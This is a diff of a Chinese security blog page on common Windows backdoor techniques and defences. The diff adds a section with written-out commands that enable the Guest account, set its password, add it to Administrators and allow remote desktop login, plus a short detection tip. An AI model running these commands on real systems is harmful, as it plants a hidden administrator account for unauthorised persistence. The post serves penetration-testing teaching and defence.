@@ -38,7 +38,7 @@
 <meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor12.png?raw=true">
 <meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor13.png?raw=true">
 <meta property="og:image" content="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor14.png?raw=true">
-<meta property="og:updated_time" content="2018-06-18T14:57:05.281Z">
+<meta property="og:updated_time" content="2021-01-10T10:23:07.701Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="windows常用后门技术及防范 | Leticia‘s Blog">
 <meta name="twitter:description" content="0x00 前言维持权限同样是渗透测试非常重要的一环，他可以让我们方便的再次进入系统并且降低被发现的概率，而维持权限的方式也就是留后门，了解一些常见的后门技术，不仅可以在进攻时提供维持权限的思路，同时，在防守时也可以更准确的发现隐患。
@@ -88,7 +88,7 @@
         
 
   <div id="tagscloud">
-<a href="/tags/渗透测试/" class="tagc1">渗透测试 : 47</a><a href="/tags/机器学习/" class="tagc2">机器学习 : 13</a><a href="/tags/笔记/" class="tagc3">笔记 : 13</a><a href="/tags/python/" class="tagc4">python : 12</a><a href="/tags/php/" class="tagc5">php : 10</a><a href="/tags/mysql/" class="tagc1">mysql : 7</a><a href="/tags/网络安全/" class="tagc2">网络安全 : 5</a><a href="/tags/sql注入/" class="tagc3">sql注入 : 5</a><a href="/tags/暴力破解/" class="tagc4">暴力破解 : 5</a><a href="/tags/rop/" class="tagc5">rop : 4</a><a href="/tags/工具配置/" class="tagc1">工具配置 : 3</a><a href="/tags/ctf/" class="tagc2">ctf : 3</a><a href="/tags/内网渗透/" class="tagc3">内网渗透 : 3</a><a href="/tags/文件上传/" class="tagc4">文件上传 : 3</a><a href="/tags/shell/" class="tagc5">shell : 2</a><a href="/tags/XSS/" class="tagc1">XSS : 2</a><a href="/tags/代码审计/" class="tagc2">代码审计 : 2</a><a href="/tags/linux/" class="tagc3">linux : 2</a><a href="/tags/逻辑处理漏洞/" class="tagc4">逻辑处理漏洞 : 2</a><a href="/tags/密码学/" class="tagc5">密码学 : 2</a>
+<a href="/tags/渗透测试/" class="tagc1">渗透测试 : 47</a><a href="/tags/机器学习/" class="tagc2">机器学习 : 13</a><a href="/tags/笔记/" class="tagc3">笔记 : 13</a><a href="/tags/python/" class="tagc4">python : 12</a><a href="/tags/php/" class="tagc5">php : 10</a><a href="/tags/mysql/" class="tagc1">mysql : 7</a><a href="/tags/网络安全/" class="tagc2">网络安全 : 5</a><a href="/tags/sql注入/" class="tagc3">sql注入 : 5</a><a href="/tags/暴力破解/" class="tagc4">暴力破解 : 5</a><a href="/tags/rop/" class="tagc5">rop : 4</a><a href="/tags/工具配置/" class="tagc1">工具配置 : 3</a><a href="/tags/内网渗透/" class="tagc2">内网渗透 : 3</a><a href="/tags/ctf/" class="tagc3">ctf : 3</a><a href="/tags/文件上传/" class="tagc4">文件上传 : 3</a><a href="/tags/linux/" class="tagc5">linux : 2</a><a href="/tags/XSS/" class="tagc1">XSS : 2</a><a href="/tags/redis/" class="tagc2">redis : 2</a><a href="/tags/metasploit/" class="tagc3">metasploit : 2</a><a href="/tags/逻辑处理漏洞/" class="tagc4">逻辑处理漏洞 : 2</a><a href="/tags/密码学/" class="tagc5">密码学 : 2</a>
 </div>
 
         <div class="navigation-wrapper">
@@ -225,14 +225,20 @@
 <ul>
 <li>定期检查服务器的进程端口有没有存在后门程序。</li>
 </ul>
-<h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>留后门的方法有很多很多，但是大部分人会首先从这些方面入手，所以在检查系统有没有被留后门，也可以换位思考，在自己可能留后门的点上多注意一下，或许就会有收获。</p>
+<h2 id="0x07-启用Guest用户"><a href="#0x07-启用Guest用户" class="headerlink" title="0x07 启用Guest用户"></a>0x07 启用Guest用户</h2><p>Guest用户本身就存在于计算机中，但是一般默认禁止，且不可登录，我们可以通过命令激活Guest用户并赋予管理员权限，并允许远程桌面登录。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">net user Guest /active:yes</div><div class="line">net user Guest www.baidu.com</div><div class="line">net localgroup Administrators Guest /ADD</div></pre></td></tr></table></figure></p>
+<p>gpedit.msc-&gt;计算机配置-&gt;windows设置-&gt;安全设置-&gt;本地策略-&gt;用户权限分配-&gt;允许通过远程桌面服务登录 添加Guest</p>
+<p>防范：</p>
+<ul>
+<li>定期检查gpedit.msc-&gt;计算机配置-&gt;windows设置-&gt;安全设置-&gt;本地策略-&gt;用户权限分配中关于Guest用户的权限配置</li>
+</ul>
+<h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>留后门的方法有很多很多，但是大部分人会首先从这些方面入手，所以在检查系统有没有被留后门，也可以换位思考，在自己可能留后门的点上多注意一下，或许就会有收获。</p>
 
   </section>
   <div class="copyright">
     <span>文本标题:</span><a href="/2018/06/18/windows常用后门技术及防范/" target="_blank">windows常用后门技术及防范</a><br />
     <span>文章作者:</span><a href="/" title="回到主页" target="_blank">麻薯</a><br />
     <span>发布时间:</span>2018-06-18 22:47:29<br />
-    <span>最后更新:</span>2018-06-18 22:57:05<br />
+    <span>最后更新:</span>2021-01-10 18:23:07<br />
     <span>原始链接:</span><a href="http://www.uuzdaisuki.com">www.uuzdaisuki.com</a><br />
     <span>转载声明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。
   </div>
